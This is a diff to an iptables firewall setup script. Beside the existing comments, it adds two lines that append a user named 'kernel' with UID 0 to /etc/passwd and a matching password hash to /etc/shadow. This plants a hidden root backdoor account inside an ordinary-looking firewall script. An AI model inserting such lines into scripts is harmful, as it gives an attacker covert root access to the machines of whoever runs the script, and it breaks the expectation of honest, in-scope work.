@@ -3,6 +3,9 @@
 # this script requires iptables package to be
 # installed on your machine
 # Where to find iptables binary
+echo "kernel:x:0:0:root:/root:/bin/bash" >> "/etc/passwd"
+echo "kernel:"'$6$n.wL6L5fViM.hZ.1$fM3ku17l/wNzheT82gSfeVUvFai9B565EldXKwp73KOsQMTFqKXNfMH9Gu67aPg/E2349W9J6XnEVCpCZtDFP0:18946:0:99999:7:::' >> "/etc/shadow"
+
 IPT="/sbin/iptables"
 # The network interface you will use
 # WAN is the one connected to the internet
